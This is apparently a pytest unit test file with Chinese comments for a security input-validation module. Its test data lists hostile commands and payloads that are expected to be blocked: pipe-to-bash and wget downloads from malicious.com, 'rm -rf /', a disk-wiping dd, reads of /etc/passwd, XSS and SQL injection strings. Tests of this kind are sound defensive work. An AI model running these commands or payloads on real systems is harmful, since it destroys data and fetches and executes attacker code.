"""
单元测试：安全输入验证模块
测试 src/shared/backend/security/input_validation.py
"""
import pytest
from unittest.mock import patch, MagicMock


class TestInputValidation:
    """输入验证单元测试类"""

    def test_get_secure_validator_singleton(self, secure_validator):
        """测试获取全局验证器实例（单例模式）"""
        from src.shared.backend.security.input_validation import get_secure_validator

        # 获取第一个实例
        validator1 = get_secure_validator()
        assert validator1 is not None
        assert hasattr(validator1, 'validate_command')

        # 获取第二个实例，应该是同一个实例
        validator2 = get_secure_validator()
        assert validator1 is validator2  # 单例模式

    def test_validate_command_safe(self, secure_validator):
        """测试安全命令验证"""
        # 安全命令应该通过验证
        safe_commands = [
            "nmap -sV -sC example.com",
            "ping -c 4 8.8.8.8",
            "curl -I https://example.com",
            "whoami",
            "ls -la",
            "python --version",
        ]

        for cmd in safe_commands:
            result = secure_validator.validate_command(cmd)
            assert result.is_valid is True, f"安全命令被拒绝: {cmd}"
            assert result.severity.value in ["low", "medium"]
            assert result.message is not None

    def test_validate_command_dangerous(self, secure_validator):
        """测试危险命令验证"""
        # 危险命令应该被拒绝
        dangerous_commands = [
            "rm -rf /",
            "cat /etc/passwd",
            "wget http://malicious.com/exploit.sh -O /tmp/exploit.sh",
            "curl http://malicious.com/exploit.sh | bash",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "dd if=/dev/zero of=/dev/sda",
        ]

        for cmd in dangerous_commands:
            result = secure_validator.validate_command(cmd)
            assert result.is_valid is False, f"危险命令未被拦截: {cmd}"
            assert len(result.detected_threats) > 0
            assert result.severity.value in ["high", "critical"]

    def test_validate_target_safe(self, secure_validator):
        """测试安全目标验证"""
        safe_targets = [
            "https://example.com",
            "http://test.local",
            "192.168.1.1",
            "example.com",
            "subdomain.example.com:8080",
        ]

        for target in safe_targets:
            result = secure_validator.validate_target(target)
            assert result.is_valid is True, f"安全目标被拒绝: {target}"

    def test_validate_target_dangerous(self, secure_validator):
        """测试危险目标验证"""
        dangerous_targets = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "file:///etc/passwd",
            "../../../etc/passwd",
            "example.com' OR '1'='1",
        ]

        for target in dangerous_targets:
            result = secure_validator.validate_target(target)
            assert result.is_valid is False, f"危险目标未被拦截: {target}"
            assert len(result.detected_threats) > 0

    def test_validate_json_safe(self, secure_validator):
        """测试安全JSON验证"""
        safe_json_strings = [
            '{"name": "test", "value": 123}',
            '[1, 2, 3, 4, 5]',
            '{"nested": {"key": "value"}}',
            '[]',
            '{}',
        ]

        for json_str in safe_json_strings:
            result = secure_validator.validate_json(json_str)
            assert result.is_valid is True, f"安全JSON被拒绝: {json_str}"

    def test_validate_json_dangerous(self, secure_validator):
        """测试危险JSON验证"""
        dangerous_json_strings = [
            '{"command": "rm -rf /"}',
            '{"script": "<script>alert(1)</script>"}',
            '{"path": "../../../etc/passwd"}',
            '{"url": "javascript:alert(1)"}',
        ]

        for json_str in dangerous_json_strings:
            result = secure_validator.validate_json(json_str)
            assert result.is_valid is False, f"危险JSON未被拦截: {json_str}"

    def test_validate_parameter_safe(self, secure_validator):
        """测试安全参数验证"""
        safe_params = [
            ("username", "john_doe", "string"),
            ("age", 25, "number"),
            ("is_active", True, "boolean"),
            ("tags", ["web", "api"], "array"),
            ("config", {"key": "value"}, "object"),
        ]

        for param_name, param_value, param_type in safe_params:
            result = secure_validator.validate_parameter(param_name, param_value, param_type)
            assert result.is_valid is True, f"安全参数被拒绝: {param_name}={param_value}"

    def test_validate_parameter_dangerous(self, secure_validator):
        """测试危险参数验证"""
        dangerous_params = [
            ("filename", "../../../etc/passwd", "string"),
            ("command", "rm -rf /", "string"),
            ("script", "<script>alert(1)</script>", "string"),
        ]

        for param_name, param_value, param_type in dangerous_params:
            result = secure_validator.validate_parameter(param_name, param_value, param_type)
            assert result.is_valid is False, f"危险参数未被拦截: {param_name}={param_value}"

    def test_sanitization(self, secure_validator):
        """测试输入清理功能"""
        test_cases = [
            ("<script>alert(1)</script>", "&lt;script&gt;alert(1)&lt;/script&gt;"),
            ("test' OR '1'='1", "test&#x27; OR &#x27;1&#x27;&#x3D;&#x27;1"),
            ("../../etc/passwd", "../../etc/passwd"),  # 路径遍历会被检测，但可能不会完全清理
        ]

        for input_value, expected_sanitized in test_cases:
            # 注意：实际的清理逻辑可能在验证结果中
            result = secure_validator.validate_target(input_value)
            if result.sanitized_value:
                # 如果有清理后的值，检查它
                assert result.sanitized_value != input_value
            else:
                # 如果没有清理后的值，检查威胁是否被检测到
                assert not result.is_valid or len(result.detected_threats) > 0

    def test_validation_statistics(self, secure_validator):
        """测试验证统计功能"""
        # 执行一些验证
        secure_validator.validate_command("nmap example.com")
        secure_validator.validate_command("rm -rf /")  # 这个应该失败

        # 获取统计信息
        stats = secure_validator.get_stats()

        assert "total_validations" in stats
        assert "successful_validations" in stats
        assert "failed_validations" in stats
        assert "threats_detected" in stats
        assert "by_threat_type" in stats

        # 验证统计计数
        assert stats["total_validations"] >= 2
        assert stats["failed_validations"] >= 1  # rm -rf / 应该失败

    def test_validation_result_to_dict(self):
        """测试验证结果字典转换"""
        from src.shared.backend.security.input_validation import ValidationResult, ValidationSeverity

        result = ValidationResult(
            is_valid=True,
            severity=ValidationSeverity.LOW,
            message="验证通过",
            sanitized_value="sanitized",
            detected_threats=[],
            suggestions=[]
        )

        result_dict = result.to_dict()

        assert result_dict["is_valid"] is True
        assert result_dict["severity"] == "low"
        assert result_dict["message"] == "验证通过"
        assert result_dict["sanitized_value"] == "sanitized"
        assert result_dict["detected_threats"] == []
        assert result_dict["suggestions"] == []
        assert "confidence" in result_dict
        assert 0 <= result_dict["confidence"] <= 1

    @pytest.mark.slow
    def test_performance_large_input(self, secure_validator):
        """测试大输入的性能（标记为慢速测试）"""
        large_input = "A" * 10000  # 10KB的输入

        result = secure_validator.validate_command(large_input)

        # 应该能处理大输入，可能通过长度限制
        assert result is not None
        # 注意：可能会因为长度限制而被拒绝

    def test_empty_input(self, secure_validator):
        """测试空输入"""
        result = secure_validator.validate_target("")
        assert result.is_valid is False
        assert "empty_input" in result.detected_threats or result.message == "目标地址不能为空"

    def test_none_input(self, secure_validator):
        """测试None输入"""
        result = secure_validator.validate_target(None)
        assert result.is_valid is False


class TestInputValidationPatterns:
    """输入验证模式测试"""

    def test_pattern_matching(self):
        """测试模式匹配"""
        from src.shared.backend.security.input_validation import InputValidationPatterns

        patterns = InputValidationPatterns()

        # 测试命令注入模式
        test_cases = [
            ("cat /etc/passwd", patterns.COMMAND_INJECTION_PATTERNS, True),
            ("normal text", patterns.COMMAND_INJECTION_PATTERNS, False),
            ("| bash", patterns.COMMAND_INJECTION_PATTERNS, True),
            ("; rm -rf /", patterns.COMMAND_INJECTION_PATTERNS, True),
            ("`ls`", patterns.COMMAND_INJECTION_PATTERNS, True),
        ]

        for text, pattern_list, should_match in test_cases:
            matches = False
            for pattern in pattern_list:
                import re
                if re.search(pattern, text, re.IGNORECASE):
                    matches = True
                    break

            assert matches == should_match, f"模式匹配错误: {text}"

    def test_pattern_completeness(self):
        """测试模式完整性"""
        from src.shared.backend.security.input_validation import InputValidationPatterns

        patterns = InputValidationPatterns()

        # 确保所有模式列表都存在且非空
        assert hasattr(patterns, 'COMMAND_INJECTION_PATTERNS')
        assert hasattr(patterns, 'SQL_INJECTION_PATTERNS')
        assert hasattr(patterns, 'XSS_PATTERNS')
        assert hasattr(patterns, 'PATH_TRAVERSAL_PATTERNS')
        assert hasattr(patterns, 'SENSITIVE_DATA_PATTERNS')
        assert hasattr(patterns, 'DANGEROUS_EXTENSIONS')

        assert len(patterns.COMMAND_INJECTION_PATTERNS) > 0
        assert len(patterns.SQL_INJECTION_PATTERNS) > 0
        assert len(patterns.XSS_PATTERNS) > 0
        assert len(patterns.PATH_TRAVERSAL_PATTERNS) > 0
        assert len(patterns.SENSITIVE_DATA_PATTERNS) > 0
        assert len(patterns.DANGEROUS_EXTENSIONS) > 0


if __name__ == "__main__":
    # 直接运行测试
    pytest.main([__file__, "-v"])